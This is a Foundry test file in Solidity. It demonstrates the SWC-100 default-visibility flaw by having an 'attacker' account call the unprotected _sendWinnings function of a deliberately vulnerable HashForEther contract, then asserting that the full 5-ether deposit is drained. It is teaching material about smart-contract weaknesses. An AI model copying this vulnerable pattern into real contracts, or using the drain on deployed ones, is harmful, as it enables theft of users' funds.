// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Utilities} from "./Utilities.sol";
import "src/SWC-100/HashForEther.sol";

contract SWC100Test is Test {
    uint256 constant DEPOSIT = 5 ether;

    Utilities internal utils;

    address payable private deployer;
    address payable private attacker;

    HashForEther private hashForEther;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        deployer = users[0];
        vm.label(deployer, "Deployer");

        attacker = users[1];
        vm.label(attacker, "Attacker");

        vm.prank(deployer);
        hashForEther = (new HashForEther){value: DEPOSIT}();

        assertEq(hashForEther.balance(), 5 ether);
    }

    function testSWC100() public {
        vm.prank(attacker);
        hashForEther._sendWinnings();
        assertEq(
            address(attacker).balance,
            utils.INITIAL_USER_BALANCE() + DEPOSIT
        );
        assertEq(address(hashForEther).balance, 0);
    }
}
